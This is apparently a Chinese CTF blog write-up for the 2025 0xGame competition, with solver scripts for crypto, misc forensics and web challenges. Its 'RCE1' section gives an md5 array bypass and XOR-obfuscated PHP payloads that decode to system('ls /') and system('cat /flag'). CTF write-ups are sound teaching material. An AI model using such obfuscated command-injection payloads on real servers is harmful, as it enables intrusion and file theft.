---
title: "2025 0xgame ctf"
date: 2025-12-10 08:49:33
categories: "比赛wp"
tags:
  - "比赛wp"
cover: /img/backgrounds/bg-14.png
top_img: /img/backgrounds/bg-14.png
disableNunjucks: true
---

## 密码
### Vigenere Advanced


```plain
from string import digits, ascii_letters, punctuation

alphabet = digits + ascii_letters + punctuation
n_mod = len(alphabet)

key = "QAQ(@.@)"
key_bias = [alphabet.index(k) for k in key]

ciphertext = "0l0CSoYM<c;amo_P_"
cipher_index = [alphabet.index(c) for c in ciphertext]

# Expected flag format: "0xGame{...}"
flag = []
for i in range(len(ciphertext)):
    n = cipher_index[i]
    bias = key_bias[i % len(key_bias)]
    solutions = []
    for x in range(n_mod):
        if (x * (x + bias)) % n_mod == n:
            solutions.append(x)

    if i < 7:
        # First 7 characters: "0xGame{"
        expected_chars = "0xGame{"
        expected_index = alphabet.index(expected_chars[i])
        if expected_index in solutions:
            flag.append(expected_chars[i])
        else:
            flag.append('?')
    elif i == len(ciphertext) - 1:
        # Last character: '}'
        expected_index = alphabet.index('}')
        if expected_index in solutions:
            flag.append('}')
        else:
            flag.append('?')
    else:
        # Middle characters: lowercase letters only (indices 10-35)
        found = None
        for x in solutions:
            if 10 <= x <= 35:
                found = x
                break
        if found is not None:
            flag.append(alphabet[found])
        else:
            flag.append('?')

print(''.join(flag))
```

结果为0xGame{axcellent}，改为0xGame{excellent}提交发现对了



### Diffie-Hellman
![](/assets/docs/比赛wp/2025 0xgame ctf/img-001.png)



```bash
# Retry with corrected string quoting to avoid the previous syntax issue.
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes
from Crypto.Util.Padding import unpad
from hashlib import sha256
import binascii, textwrap

ct_hex = "db34efa2ac681086958efe7037b398a552ec234944d18daeeeac11ec1a944645c97e664fd652fc5d2f765d92e1903dd5"
ct = binascii.unhexlify(ct_hex)

key = sha256(long_to_bytes(1)).digest()  # sha256(b'\x01')
cipher = AES.new(key, AES.MODE_ECB)
pt = unpad(cipher.decrypt(ct), 16)
print("Decrypted flag (bytes):", pt)
print("Decrypted flag (utf-8):", pt.decode())

#Decrypted flag (bytes): b'0xGame{20a245b1-a1d9-48ef-8ad1-21d0cf18ed08}'
#Decrypted flag (utf-8): 0xGame{20a245b1-a1d9-48ef-8ad1-21d0cf18ed08}

```



### Vigenere
<font style="color:rgb(15, 17, 21);">对每个密文字符，根据密钥字符的偏移量进行反向计算。</font>

```bash
from string import digits, ascii_letters, punctuation

ciphertext = 'WL"mKAaequ{q_aY$oz8`wBqLAF_{cku|eYAczt!pmoqAh+'
key = "Welcome-2025-0xGame"
alphabet = digits + ascii_letters + punctuation

def vigenere_decrypt(ciphertext, key):
    plaintext = ""
    key_index = 0
    for char in ciphertext:
        bias = alphabet.index(key[key_index])
        char_index = alphabet.index(char)
        new_index = (char_index - bias) % len(alphabet)
        plaintext += alphabet[new_index]
        key_index = (key_index + 1) % len(key)
    return plaintext

flag = vigenere_decrypt(ciphertext, key)
print(flag)
```

### 笙莲


+ 每段固定为 25 字节（因为题目把 `flag` 填充到 100 字节并均分为 4 段），脚本按此长度恢复每段字节顺序（第 2 段用 big-endian，题中 `int.from_bytes(bt)` 的默认是 big；第 4 段还原时用 little-endian）。
+ 第 2 段的自定义映射是 LSB-first 的三进制字符流（`out += mapper[num % 3]`），所以解码时需要按 `3**i` 累加。
+ 第 4 段需要取 7 次方根（整数），并校验 `r**7 == c3`。
+ 最后用 `gb2312` 连续解码（不能把每个字节/字符拆开单独 decode），脚本已实现“取最长可解前缀”以去除随机填充的干扰。

```bash
# decrypt_flag.py
# 直接运行会输出恢复的明文（使用 gb2312 解码）
from base64 import b64decode

# 题目给出的四个输出
c0_b64 = b"MHhHYW1le7u2063AtLW9MHhHYW1lMjAyNQ=="
c1_hex = "a3accfd6d4dac4e3d2d1beadd1a7bbe143727970746fb5c4bb"
c2_awaqaq = "wqwwwqqaawwwaaqawqwawwwwaaawwwawaqqwwwqaqwwqwaaqwaqqaaawqqqaqaqwaaawwwqaqaaaaqawaqqqwwqqwaqwqwwwawawqqwwqqawqwaqwwawwqwaqqaqwaw"
c3_int_str = "5787980659359196741038715872684190805073807486263453249083702093905274294594502252203577660251756609738877887210677202141957646934092054500618364441642896304387589669635034683021946777034215355675802286923927161922717560413551789421376288823912349463080999424773600185557948875343480056576969695671340947861706467351885610345887785319870159654836532664189086047061137903149197973327299859185905186913896041309284477616128"

part_len = 25  # 题目把 flag 填充/分割为 4 段，每段 25 字节

# part0: base64 -> bytes
part0 = b64decode(c0_b64)

# part1: hex -> bytes
part1 = bytes.fromhex(c1_hex)

# part2: 自定义 base-3 映射：mapper {0:'a',1:'w',2:'q'}，awaqaq 把 int.from_bytes(bt) (big-endian) 转为 LSB-first 的三进制字符流
rev_map = {'a':0, 'w':1, 'q':2}
num = 0
for i, ch in enumerate(c2_awaqaq):
    num += rev_map[ch] * (3**i)
part2 = num.to_bytes(part_len, 'big')

# part3: c3 = int.from_bytes(flags[3], 'little') ** 7 -> 取 7 次方根，结果是 little-endian bytes
c3 = int(c3_int_str)
# 精确整数 k 次根（双端二分）
def integer_nth_root(n, k):
    lo = 0
    hi = 1 << ((n.bit_length() + k - 1) // k + 1)
    while lo <= hi:
        mid = (lo + hi) // 2
        p = mid**k
        if p == n:
            return mid
        if p < n:
            lo = mid + 1
        else:
            hi = mid - 1
    return hi

r = integer_nth_root(c3, 7)
if r**7 != c3:
    raise ValueError("7th root not exact; 输入可能有误")
part3 = r.to_bytes(part_len, 'little')

full = part0 + part1 + part2 + part3  # 共 100 字节（含随机填充）

# 尝试用 gb2312 连续解码；若整段无法严格解码，取最长可解前缀（题目提示：多字节编码需要连续 decode）
try:
    decoded = full.decode('gb2312')
    print("Decoded (strict gb2312):")
    print(decoded)
except Exception:
    # 找最长可解 prefix
    for L in range(len(full), 0, -1):
        try:
            s = full[:L].decode('gb2312')
            print(s)
            break
        except:
            continue

```

```bash
0xGame{欢迎来到0xGame2025，现在你已经学会Crypto的基本知识了，快来试试更难的挑战吧！}
```



### Ez_RSA
分解n

![](/assets/docs/比赛wp/2025 0xgame ctf/img-002.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-003.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-004.png)

### 2FA
点击注册，输入用户名弹出二维码，扫描

![](/assets/docs/比赛wp/2025 0xgame ctf/img-005.png)

```bash
import pyotp
totp = pyotp.TOTP("5UNDCDMYGCJVJIVL3OOSZE7PHHS7L2A3")
print(totp.now())
## 433365
```

![](/assets/docs/比赛wp/2025 0xgame ctf/img-006.png)

### 芸翎
爆破验证码

![](/assets/docs/比赛wp/2025 0xgame ctf/img-007.png)



```bash
import re
import hashlib
import itertools
import string
import sys

def solve_pow(prompt_line: str):
    # 正则匹配 "sha256(XXXX+后缀) == 哈希值"
    match = re.match(r'sha256\(XXXX\+([A-Za-z0-9]+)\) == ([0-9a-fA-F]+)', prompt_line)
    if not match:
        print("输入格式不正确，请输入类似: sha256(XXXX+abc123) == 0123456789abcdef...")
        return
    suffix = match.group(1)
    target_hash = match.group(2).lower()

    print(f"[*] 正在爆破 XXXX+{suffix} -> {target_hash}")

    # 爆破所有 4 字符组合
    for prefix_tuple in itertools.product(string.ascii_letters + string.digits, repeat=4):
        prefix = "".join(prefix_tuple)
        candidate = prefix + suffix
        h = hashlib.sha256(candidate.encode()).hexdigest()
        if h == target_hash:
            print(f"[+] 找到解: {prefix}")
            return
    print("[-] 未找到解")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        solve_pow(sys.argv[1])
    else:
        while True:
            line = input("请输入题目行(sha256(XXXX+...)=...): ").strip()
            if not line:
                continue
            solve_pow(line)
            
            
```

![](/assets/docs/比赛wp/2025 0xgame ctf/img-008.png)

```bash
from Crypto.Util.number import inverse

# 题目给出的数据
n = 2123879445083006562377433086573471479574595518091098404570535395620465677516407411874190700008501788563312658116818433079824109712675520403868672973418404156679688291040647171150581335329795044529430294453270607819224089927595454103558793003568545362242675184282795038705598928544005496907205688749421269062180001044213226976685754924340281155070293235666125920123503104575521683368601180650046208126560480007816113121547579791597764263160866329716243881944732452493111804123606354075932846055761278549312561943997813013591782966286617675395392887138995188415329983995443390671788464294743740991096298773662977
e = 65537
c_hex = "49f2f55bad5cd81da6e6d71e2ca9ceeaeef6bf75427c4143927fca794b466df07a3dc485017ce1af3504c0f89c5f8d7d14f80502375153b6772aaff099b89e16c7030a7fdd39d950fc8c9bcd83b38e069e276b7e28efb88df75754b7bb9e64d545b58f578aa6f0ec2cae255adf9a5b656a31cea23c496581bb930c31424a9b9d429f44dee17cc475404e1948196d96c891b84f1722918ebbe643d009f71b85582ff301bf4aee8eaa901db8ff962247898314f88431e23e0aaeee1522363882d7334bf1cd40e901d4a05ac4c7fad16795c94e585d2adec091840fd6f453b2110835970635cfce07b33be54a537c8da3df2fceb15ea5290cba28a53333e300"

# 将密文从 little-endian 十六进制转成整数
c = int.from_bytes(bytes.fromhex(c_hex), 'little')

# 计算欧拉函数 φ(n) = n-1
phi = n - 1

# 计算私钥 d
d = inverse(e, phi)

# 解密得到明文 m
m = pow(c, d, n)

# 将 m 转成字节
flag_bytes = m.to_bytes((m.bit_length() + 7) // 8, 'big')

# 提取 flag（去掉后面的随机字节）
try:
    flag = flag_bytes.decode('utf-8').strip()
except:
    flag = flag_bytes

print("Flag:", flag)
```

## misc
### Sign_in
![](/assets/docs/比赛wp/2025 0xgame ctf/img-009.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-010.png)

0xGame{Welc0me_t0_0xG4m3_2o25_@nd_h@ck_For_fuN}



### ez_Shell
打开finallshell

![](/assets/docs/比赛wp/2025 0xgame ctf/img-011.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-012.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-013.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-014.png)

0xGame{hacker_/home/hacker_.mysecret_It_is_funny_right?_You_hacked_me!!!}

### 公众号原稿
文档没发现东西，重命名为zip

![](/assets/docs/比赛wp/2025 0xgame ctf/img-015.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-016.png)

### Zootopia
![](/assets/docs/比赛wp/2025 0xgame ctf/img-017.png)

### Do not enter
使用FTK挂载镜像

![](/assets/docs/比赛wp/2025 0xgame ctf/img-018.png)

auth.log日志文件中有很多假flag

syslog包含用户进行的操作

其中一个磁盘中有yolo用户进行的提权操作

对应的syslog日志文件中含有真的flag: 0xGame{WoW_y0u_fouNd_1t?_114514}

114514也可以一眼看出来

![](/assets/docs/比赛wp/2025 0xgame ctf/img-019.png)

### ezShell_PLUS
在/home/welcome/challenge/目录下发现hash值文件和解密脚本

![](/assets/docs/比赛wp/2025 0xgame ctf/img-020.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-021.png)

b16685b3274bf27c5c6969fad1a4f04130d5948f3302b2fb4c83110465b3eec9

![](/assets/docs/比赛wp/2025 0xgame ctf/img-022.png)

/home/welcome/challenge/files/下为加密后的文件

寻找哈希值**<font style="color:rgb(0, 0, 0) !important;">内容的 SHA-256 哈希值为 </font>**`**<font style="color:rgb(0, 0, 0);">b16685b3274bf27c5c6969fad1a4f04130d5948f3302b2fb4c83110465b3eec9</font>**`**<font style="color:rgb(0, 0, 0) !important;"> 的文件</font>**

<font style="color:rgba(0, 0, 0, 0.85);">通过 </font>`<font style="color:rgba(0, 0, 0, 0.85);">sha256sum</font>`<font style="color:rgba(0, 0, 0, 0.85);"> 命令批量计算每个文件的哈希值，再与目标哈希匹配</font>

```plain
sha256sum *.dat | grep "b16685b3274bf27c5c6969fad1a4f04130d5948f3302b2fb4c83110465b3eec9"
```

![](/assets/docs/比赛wp/2025 0xgame ctf/img-023.png)

使用解密脚本解密文件

![](/assets/docs/比赛wp/2025 0xgame ctf/img-024.png)

## web
### Lemon
使用view-source:查看源码

![](/assets/docs/比赛wp/2025 0xgame ctf/img-025.png)



### RCE1
<font style="color:rgb(0, 119, 0);">(</font><font style="color:rgb(0, 0, 187);">md5</font><font style="color:rgb(0, 119, 0);">(</font><font style="color:rgb(0, 0, 187);">$rce1</font><font style="color:rgb(0, 119, 0);">) === </font><font style="color:rgb(0, 0, 187);">md5</font><font style="color:rgb(0, 119, 0);">(</font><font style="color:rgb(0, 0, 187);">$rce2</font><font style="color:rgb(0, 119, 0);">) 数组绕过</font>

<font style="color:rgb(0, 119, 0);">第一部分 ("%03%09%03%04%15%1D"^"%70%70%70%70%70%70")通过位异或操作解码为字符串 "system"。</font>

<font style="color:rgb(0, 119, 0);"></font>

<font style="color:rgb(0, 119, 0);">第二部分("%1C%03%50%5F"^"%70%70%70%70") 通过位异或操作解码为字符串 "ls /"。</font>

<font style="color:rgb(0, 119, 0);">("%03%09%03%04%15%1D"^"%70%70%70%70%70%70")("%1C%03%50%5F"^"%70%70%70%70");  #system("ls /")</font>

![](/assets/docs/比赛wp/2025 0xgame ctf/img-026.png)

("%03%09%03%04%15%1D"^"%70%70%70%70%70%70")("%13%11%04%50%5F%16%1C%11%17"^"%70%70%70%70%70%70%70%70%70");  #sysytem('cat /flag')

![](/assets/docs/比赛wp/2025 0xgame ctf/img-027.png)

### 留言板（粉
非预期

![](/assets/docs/比赛wp/2025 0xgame ctf/img-028.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-029.png)

### Http的真理，我已解明
![](/assets/docs/比赛wp/2025 0xgame ctf/img-030.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-031.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-032.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-033.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-034.png)

![](/assets/docs/比赛wp/2025 0xgame ctf/img-035.png)

